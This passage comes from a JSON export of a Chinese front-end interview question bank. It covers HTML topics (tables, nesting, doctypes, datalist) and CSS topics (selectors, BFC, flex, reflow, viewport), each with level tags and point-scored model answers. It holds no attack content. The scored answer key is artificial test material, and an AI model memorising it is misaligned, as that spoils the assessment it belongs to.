可用于布局（已过时）；\\n\\n","task":false,"loose":true,"text":"可用于布局（已过时）；\\n","tokens":[{"type":"text","raw":"可用于布局（已过时）；\\n","text":"可用于布局（已过时）；","tokens":[{"type":"text","raw":"可用于布局（已过时）；","text":"可用于布局（已过时）；","escaped":false}]}]},{"type":"list_item","raw":"- 用于显示批量数据；","task":false,"loose":true,"text":"用于显示批量数据；","tokens":[{"type":"text","raw":"用于显示批量数据；","text":"用于显示批量数据；","tokens":[{"type":"text","raw":"用于显示批量数据；","text":"用于显示批量数据；","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"优点","text":"优点","tokens":[{"type":"text","raw":"优点","text":"优点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在某些场合，使用Table是100%的适合、恰当和正确。比如，用table做表格是完全正确的；","text":"在某些场合，使用Table是100%的适合、恰当和正确。比如，用table做表格是完全正确的；","tokens":[{"type":"text","raw":"在某些场合，使用Table是100%的适合、恰当和正确。比如，用table做表格是完全正确的；","text":"在某些场合，使用Table是100%的适合、恰当和正确。比如，用table做表格是完全正确的；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"缺点","text":"缺点","tokens":[{"type":"text","raw":"缺点","text":"缺点","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Table要比其它html标记占更多的字节，会导致延迟下载时间，占用服务器更多的流量资源；","text":"Table要比其它html标记占更多的字节，会导致延迟下载时间，占用服务器更多的流量资源；","tokens":[{"type":"text","raw":"Table要比其它html标记占更多的字节，会导致延迟下载时间，占用服务器更多的流量资源；","text":"Table要比其它html标记占更多的字节，会导致延迟下载时间，占用服务器更多的流量资源；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Table会阻挡浏览器渲染引擎的渲染顺序，这会导致延迟页面的生成速度，让用户等待更久的时间；","text":"Table会阻挡浏览器渲染引擎的渲染顺序，这会导致延迟页面的生成速度，让用户等待更久的时间；","tokens":[{"type":"text","raw":"Table会阻挡浏览器渲染引擎的渲染顺序，这会导致延迟页面的生成速度，让用户等待更久的时间；","text":"Table会阻挡浏览器渲染引擎的渲染顺序，这会导致延迟页面的生成速度，让用户等待更久的时间；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"灵活性差，比如要通多td才能设置tr的border属性；","text":"灵活性差，比如要通多td才能设置tr的border属性；","tokens":[{"type":"text","raw":"灵活性差，比如要通多td才能设置tr的border属性；","text":"灵活性差，比如要通多td才能设置tr的border属性；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"代码臃肿，当在table中套用table的时候，阅读代码会显得异常混乱；","text":"代码臃肿，当在table中套用table的时候，阅读代码会显得异常混乱；","tokens":[{"type":"text","raw":"代码臃肿，当在table中套用table的时候，阅读代码会显得异常混乱；","text":"代码臃肿，当在table中套用table的时候，阅读代码会显得异常混乱；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"混乱的colspan与rowspan，用来布局时，频繁使用他们会造成整个文档顺序混乱；","text":"混乱的colspan与rowspan，用来布局时，频繁使用他们会造成整个文档顺序混乱；","tokens":[{"type":"text","raw":"混乱的colspan与rowspan，用来布局时，频繁使用他们会造成整个文档顺序混乱；","text":"混乱的colspan与rowspan，用来布局时，频繁使用他们会造成整个文档顺序混乱；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"深层的嵌套，导致搜索引擎读取困难，同时还很大程度上增加了代码冗余；","text":"深层的嵌套，导致搜索引擎读取困难，同时还很大程度上增加了代码冗余；","tokens":[{"type":"text","raw":"深层的嵌套，导致搜索引擎读取困难，同时还很大程度上增加了代码冗余；","text":"深层的嵌套，导致搜索引擎读取困难，同时还很大程度上增加了代码冗余；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"不够语义。","text":"不够语义。","tokens":[{"type":"text","raw":"不够语义。","text":"不够语义。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 39. HTML元素如何体现其嵌套关系\\n\\n","depth":2,"text":"39. HTML元素如何体现其嵌套关系","tokens":[{"type":"text","raw":"39. HTML元素如何体现其嵌套关系","text":"39. HTML元素如何体现其嵌套关系","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"块级元素可以包含行内元素；","text":"块级元素可以包含行内元素；","tokens":[{"type":"text","raw":"块级元素可以包含行内元素；","text":"块级元素可以包含行内元素；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"块级元素不一定能包含块级元素；","text":"块级元素不一定能包含块级元素；","tokens":[{"type":"text","raw":"块级元素不一定能包含块级元素；","text":"块级元素不一定能包含块级元素；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"行内元素一般不能包含块级元素（a元素例外）","text":"行内元素一般不能包含块级元素（a元素例外）","tokens":[{"type":"text","raw":"行内元素一般不能包含块级元素（a元素例外）","text":"行内元素一般不能包含块级元素（a元素例外）","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 40. 几种Doctype文档类型\\n\\n","depth":2,"text":"40. 几种Doctype文档类型","tokens":[{"type":"text","raw":"40. 几种Doctype文档类型","text":"40. 几种Doctype文档类型","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。","text":"标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。","tokens":[{"type":"text","raw":"标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。","text":"标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"HTML 4.01 规定了三种文档类型：分别是Strict、Transitional 以及 Frameset；","text":"HTML 4.01 规定了三种文档类型：分别是Strict、Transitional 以及 Frameset；","tokens":[{"type":"text","raw":"HTML 4.01 规定了三种文档类型：分别是Strict、Transitional 以及 Frameset；","text":"HTML 4.01 规定了三种文档类型：分别是Strict、Transitional 以及 Frameset；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"XHTML 1.0 规定了三种 XML 文档类型：分别是Strict、Transitional 以及 Frameset；","text":"XHTML 1.0 规定了三种 XML 文档类型：分别是Strict、Transitional 以及 Frameset；","tokens":[{"type":"text","raw":"XHTML 1.0 规定了三种 XML 文档类型：分别是Strict、Transitional 以及 Frameset；","text":"XHTML 1.0 规定了三种 XML 文档类型：分别是Strict、Transitional 以及 Frameset；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页；","text":"Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页；","tokens":[{"type":"text","raw":"Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页；","text":"Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。","text":"Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。","tokens":[{"type":"text","raw":"Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。","text":"Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 41. 什么是前端的结构，样式和行为相分离？以及分离的好处是什么？\\n\\n","depth":2,"text":"41. 什么是前端的结构，样式和行为相分离？以及分离的好处是什么？","tokens":[{"type":"text","raw":"41. 什么是前端的结构，样式和行为相分离？以及分离的好处是什么？","text":"41. 什么是前端的结构，样式和行为相分离？以及分离的好处是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"结构，样式和行为分离","text":"结构，样式和行为分离","tokens":[{"type":"text","raw":"结构，样式和行为分离","text":"结构，样式和行为分离","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"若是将前端比作一个人来举例子，结构（HTML）就相当于是人体的“骨架”，样式就相当于人体的“装饰”，例如衣服，首饰等；行为就相当于人做出的一系列“动作”。\\n在结构，样式和行为分离，就是将三者分离开，各自负责各自的内容，各部分可以通过引用进行使用。\\n在分离的基础上，我们需要做到代码的：精简， 重用， 有序。","text":"若是将前端比作一个人来举例子，结构（HTML）就相当于是人体的“骨架”，样式就相当于人体的“装饰”，例如衣服，首饰等；行为就相当于人做出的一系列“动作”。\\n在结构，样式和行为分离，就是将三者分离开，各自负责各自的内容，各部分可以通过引用进行使用。\\n在分离的基础上，我们需要做到代码的：精简， 重用， 有序。","tokens":[{"type":"text","raw":"若是将前端比作一个人来举例子，结构（HTML）就相当于是人体的“骨架”，样式就相当于人体的“装饰”，例如衣服，首饰等；行为就相当于人做出的一系列“动作”。\\n在结构，样式和行为分离，就是将三者分离开，各自负责各自的内容，各部分可以通过引用进行使用。\\n在分离的基础上，我们需要做到代码的：精简， 重用， 有序。","text":"若是将前端比作一个人来举例子，结构（HTML）就相当于是人体的“骨架”，样式就相当于人体的“装饰”，例如衣服，首饰等；行为就相当于人做出的一系列“动作”。\\n在结构，样式和行为分离，就是将三者分离开，各自负责各自的内容，各部分可以通过引用进行使用。\\n在分离的基础上，我们需要做到代码的：精简， 重用， 有序。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"分离的好处:","text":"分离的好处:","tokens":[{"type":"text","raw":"分离的好处:","text":"分离的好处:","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"代码分离，利于团队的开发和后期的维护；","text":"代码分离，利于团队的开发和后期的维护；","tokens":[{"type":"text","raw":"代码分离，利于团队的开发和后期的维护；","text":"代码分离，利于团队的开发和后期的维护；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"减少维护成本，提高可读性和更好的兼容性；","text":"减少维护成本，提高可读性和更好的兼容性；","tokens":[{"type":"text","raw":"减少维护成本，提高可读性和更好的兼容性；","text":"减少维护成本，提高可读性和更好的兼容性；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 42. 如何对网站的文件和资源进行优化\\n\\n","depth":2,"text":"42. 如何对网站的文件和资源进行优化","tokens":[{"type":"text","raw":"42. 如何对网站的文件和资源进行优化","text":"42. 如何对网站的文件和资源进行优化","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"文件合并（目的是减少http请求）；","text":"文件合并（目的是减少http请求）；","tokens":[{"type":"text","raw":"文件合并（目的是减少http请求）；","text":"文件合并（目的是减少http请求）；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"文件压缩 （目的是直接减少文件下载的体积）；","text":"文件压缩 （目的是直接减少文件下载的体积）；","tokens":[{"type":"text","raw":"文件压缩 （目的是直接减少文件下载的体积）；","text":"文件压缩 （目的是直接减少文件下载的体积）；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用缓存；","text":"使用缓存；","tokens":[{"type":"text","raw":"使用缓存；","text":"使用缓存；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用cdn托管资源；","text":"使用cdn托管资源；","tokens":[{"type":"text","raw":"使用cdn托管资源；","text":"使用cdn托管资源；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"gizp压缩需要的js和css文件；","text":"gizp压缩需要的js和css文件；","tokens":[{"type":"text","raw":"gizp压缩需要的js和css文件；","text":"gizp压缩需要的js和css文件；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"反向链接，网站外链接优化；","text":"反向链接，网站外链接优化；","tokens":[{"type":"text","raw":"反向链接，网站外链接优化；","text":"反向链接，网站外链接优化；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"meta标签优化（title, description, keywords）,heading标签的优化,alt优化；","text":"meta标签优化（title, description, keywords）,heading标签的优化,alt优化；","tokens":[{"type":"text","raw":"meta标签优化（title, description, keywords）,heading标签的优化,alt优化；","text":"meta标签优化（title, description, keywords）,heading标签的优化,alt优化；","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 43. Html5中datalist是什么\\n\\n","depth":2,"text":"43. Html5中datalist是什么","tokens":[{"type":"text","raw":"43. Html5中datalist是什么","text":"43. Html5中datalist是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"datalist标签，用来定义选项列表，与input元素配合使用该元素，来定义input可能的值。","text":"datalist标签，用来定义选项列表，与input元素配合使用该元素，来定义input可能的值。","tokens":[{"type":"text","raw":"datalist标签，用来定义选项列表，与input元素配合使用该元素，来定义input可能的值。","text":"datalist标签，用来定义选项列表，与input元素配合使用该元素，来定义input可能的值。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"datalist及其选项不会被显示出来，他仅仅是合法的输入列表值。","text":"datalist及其选项不会被显示出来，他仅仅是合法的输入列表值。","tokens":[{"type":"text","raw":"datalist及其选项不会被显示出来，他仅仅是合法的输入列表值。","text":"datalist及其选项不会被显示出来，他仅仅是合法的输入列表值。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<input id=\\"fruits\\" list=\\"fruit\\" /><datalist id=\\"fruit\\">  <option value=\\"apple\\">  <option value=\\"orange\\">  <option value=\\"banana\\"></datalist>\\n```","lang":"html","text":"<input id=\\"fruits\\" list=\\"fruit\\" /><datalist id=\\"fruit\\">  <option value=\\"apple\\">  <option value=\\"orange\\">  <option value=\\"banana\\"></datalist>"}]},{"key":"CSS","content":"<h1>CSS</h1>\\n<h2>1. CSS 有哪些选择器？权重是如何计算的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>基本选择器：ID 选择器 &gt; 类选择器/伪类选择器/属性选择器 &gt; 元素选择器/伪元素选择器 &gt; 通配符选择器</li>\\n<li>关系选择器：后代选择器、父子选择器、兄弟选择器</li>\\n</ul>\\n</li>\\n<li><strong>1：</strong> ID 选择器是百分位，类选择器/伪类选择器/属性选择器是十分位，元素选择器/伪元素选择器是个位，计算选择器组合后的数字就可以作为权重大小，，通配符选择器与关系选择器都是零位，没有权重。</li>\\n</ul>\\n<h2>2. margin 和 padding 的使用场景</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>需要在border外侧添加空白，且空白处不需要背景（色）时，使用 margin；</li>\\n<li>需要在border内测添加空白，且空白处需要背景（色）时，使用 padding。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>3. 如何清除浮动?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong>\\n.clearfix{\\n  clear:both;\\n  content:&#39;&#39;;\\n  display:block;\\n  width: 0;\\n  height: 0;\\n  visibility:hidden;\\n}</li>\\n</ul>\\n<h2>4. 使元素消失的方法?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong><ul>\\n<li>visibility:hidden;</li>\\n<li>display:none;</li>\\n<li>opacity:0;</li>\\n<li>z-index:-1;</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>5. 理解BFC吗？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nBFC 即 Block Formatting Contexts (块级格式化上下文)。<br>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。<br>通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。</li>\\n</ul>\\n<h2>6. 解释 CSS 中的 flex 布局，并列举一些常用的 flex 属性及其作用</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong>\\nflex 布局（弹性布局）可以更方便地实现各种复杂的布局。常用属性包括：\\ndisplay: flex：将容器设置为弹性容器。\\nflex-direction：指定主轴方向，如 row（水平，从左到右）、row-reverse（水平，从右到左）、column（垂直，从上到下）、column-reverse（垂直，从下到上）。\\njustify-content：在主轴上对齐项目，如 flex-start（起始位置对齐）、flex-end（末尾位置对齐）、center（居中对齐）、space-between（两端对齐，项目之间均匀分布）、space-around（每个项目两侧均匀分布）。\\nalign-items：在交叉轴上对齐项目，类似 justify-content 有 flex-start、flex-end、center、baseline（项目第一行文字基线对齐）、stretch（默认值，拉伸项目以适应容器）等取值。</li>\\n</ul>\\n<h2>7. 如何减少页面回流和重绘？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 避免频繁地修改布局相关的属性: 尤其是在循环或高频事件中。例如，直接通过JavaScript频繁修改元素的 width、height 会触发回流</li>\\n<li><strong>1：</strong> 批量更新DOM: 使用 requestAnimationFrame 或 setTimeout 将多个操作合并成一次回流</li>\\n<li><strong>1：</strong> 避免修改宽高和布局计算的父元素：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式</li>\\n<li><strong>1：</strong> 使用transform和opacity代替布局属性 例如：获取元素的 offsetHeight 后立即改变元素的尺寸属性，这会导致浏览器先进行回流，再去计算样式。</li>\\n<li><strong>1：</strong> 避免频繁地修改布局相关的属性 :修改父元素的尺寸会引起子元素的回流，尽量避免直接操作父元素的尺寸，尤其是在大型布局中</li>\\n</ul>\\n<h2>8. 如何使用 calc() 函数？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> calc() 允许你在 CSS 中执行简单的数学运算。例如：</li>\\n</ul>\\n<pre><code class=\\"language-css\\">  width: calc(100% - 20px);\\n</code></pre>\\n<h2>9. CSS 中的三种常用布局方式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> float 布局：通过浮动和清除浮动来实现布局</li>\\n<li><strong>1：</strong> flex 布局：更加现代和灵活，适用于一维布局</li>\\n<li><strong>1：</strong> grid 布局：二维布局，支持更复杂的布局</li>\\n</ul>\\n<h2>10 .什么是 viewport？如何在页面中设置视口大小？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 视口是用户可以看到的网页区域。设置视口的常见做法是在 <code>&lt;head&gt;</code> 中添加如下标签</li>\\n</ul>\\n<pre><code class=\\"language-html\\">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n</code></pre>\\n<h2>11. 解释 transform、translate、scale、rotate 等属性的使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> transform 用于在 2D 或 3D 空间中对元素进行旋转、缩放、平移等操作。</li>\\n<li><strong>1：</strong> translate(x, y)：平移元素</li>\\n<li><strong>1：</strong> rotate(deg)：旋转元素。</li>\\n<li><strong>1：</strong> scale(x, y)：缩放元素。</li>\\n</ul>\\n<h2>12. 如何处理浏览器兼容性问题？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 CSS 前缀来兼容不同浏览器：例如，-webkit-，-moz-，-ms- 等。</li>\\n<li><strong>1：</strong> 使用 Autoprefixer 等工具自动添加前缀。</li>\\n<li><strong>1：</strong> 测试多个浏览器，确保关键功能正常</li>\\n<li><strong>1：</strong> 使用 CSS Reset 或 Normalize.css 来减少浏览器间的样式差异。</li>\\n</ul>\\n<h2>13. box-sizing: border-box 和 content-box 的区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> content-box（默认值）：width 和 height 只包括内容区域，不包括 padding 和 border。</li>\\n<li><strong>1：</strong> border-box：width 和 height 包括内容区域、padding 和 border。</li>\\n</ul>\\n<h2>14. CSS3有哪些重要的新特性？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 选择器和伪类：</p>\\n<ul>\\n<li>属性选择器增强</li>\\n<li>新增伪类：:nth-child()、:first-of-type等</li>\\n<li>伪元素使用双冒号::before</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 视觉效果：</p>\\n<ul>\\n<li>圆角(border-radius)</li>\\n<li>阴影(text-shadow/box-shadow)</li>\\n<li>渐变(linear-gradient/radial-gradient)</li>\\n<li>RGBA和HSLA颜色</li>\\n<li>不透明度(opacity)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 转换和动画：</p>\\n<ul>\\n<li>2D/3D转换(transform)</li>\\n<li>过渡效果(transition)</li>\\n<li>动画效果(animation/@keyframes)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 布局能力：</p>\\n<ul>\\n<li>弹性布局(display: flex)</li>\\n<li>网格布局(display: grid)</li>\\n<li>多列布局(column-count)</li>\\n<li>盒模型调整(box-sizing)</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 响应式设计：</p>\\n<ul>\\n<li>媒体查询(@media)</li>\\n<li>视口单位(vh/vw)</li>\\n<li>图像适配(object-fit)</li>\\n<li>自定义属性(变量)</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>15. 